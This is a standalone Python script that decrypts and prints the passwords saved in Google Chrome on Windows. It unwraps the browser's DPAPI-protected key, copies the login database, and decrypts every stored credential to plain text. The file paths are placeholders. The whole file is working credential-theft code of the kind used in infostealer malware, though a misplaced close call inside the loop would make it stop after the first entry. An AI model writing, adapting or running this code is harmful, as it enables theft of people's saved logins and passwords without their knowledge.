import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = "path to key"
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key_b64 = local_state["os_crypt"]["encrypted_key"]
    key = base64.b64decode(key_b64)[5:]  # remove 'DPAPI' prefix
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # extract initialization vector (IV) and encrypted password
        iv = password[3:15]
        encrypted_password = password[15:]

        # create a cipher object using the key and IV
        cipher = AES.new(key, AES.MODE_GCM, iv)

        # decrypt the password
        return cipher.decrypt(encrypted_password)[:-16].decode()
    except Exception:
        # fallback to Windows Data Protection API (DPAPI)
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except Exception:
            return ""

def main():
    # get the encryption key
    key = get_encryption_key()

    # get the path to the Chrome login database
    db_path = "path to encrypted file"

    # create a copy of the login database
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)

    # connect to the copy of the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # get the login data
    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]

        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("="*50)
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except Exception:
            pass

if __name__ == "__main__":
    main()